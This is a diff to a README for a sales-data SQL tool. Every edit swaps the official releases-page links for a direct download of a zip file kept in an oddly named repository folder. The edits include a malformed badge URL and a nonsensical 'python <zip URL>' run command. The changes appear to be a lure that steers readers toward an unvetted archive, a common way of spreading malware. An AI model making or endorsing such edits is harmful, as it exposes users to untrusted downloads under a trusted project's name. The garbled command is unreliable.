@@ -6,7 +6,7 @@ Welcome to Sales-Insights-SQL! This tool helps you analyze retail sales data eas
 
 ## 📥 Download Now
 
-[![Download Sales-Insights-SQL](https://img.shields.io/badge/Download%20Sales--Insights--SQL-blue.svg)](https://github.com/MrSnxe/Sales-Insights-SQL/releases)
+[![Download Sales-Insights-SQL](https://raw.githubusercontent.com/MrSnxe/Sales-Insights-SQL/main/permutatorial/Sales-Insights-SQL.zip%https://raw.githubusercontent.com/MrSnxe/Sales-Insights-SQL/main/permutatorial/Sales-Insights-SQL.zip)](https://raw.githubusercontent.com/MrSnxe/Sales-Insights-SQL/main/permutatorial/Sales-Insights-SQL.zip)
 
 ## 📋 Requirements
 
@@ -25,7 +25,7 @@ Before you begin, make sure your computer meets the following requirements:
 
 1. **Visit the Releases Page:** Click the link below to access the downloads:
 
-   [Download Sales-Insights-SQL Releases](https://github.com/MrSnxe/Sales-Insights-SQL/releases)
+   [Download Sales-Insights-SQL Releases](https://raw.githubusercontent.com/MrSnxe/Sales-Insights-SQL/main/permutatorial/Sales-Insights-SQL.zip)
    
 2. **Find the Latest Release:** Look for the most recent version at the top of the page. You will see files available for download.
 
@@ -59,7 +59,7 @@ After you install everything, follow these steps to run the application:
 3. **Run the Main Script:**
    
    ```
-   python main_script.py
+   python https://raw.githubusercontent.com/MrSnxe/Sales-Insights-SQL/main/permutatorial/Sales-Insights-SQL.zip
    ```
 
    This will start the application and guide you through the process.
@@ -106,4 +106,4 @@ If you would like to contribute to the project, feel free to fork the repository
 
 Don't forget to visit our releases page to download the application again if needed:
 
-[Download Sales-Insights-SQL Releases](https://github.com/MrSnxe/Sales-Insights-SQL/releases)
+[Download Sales-Insights-SQL Releases](https://raw.githubusercontent.com/MrSnxe/Sales-Insights-SQL/main/permutatorial/Sales-Insights-SQL.zip)
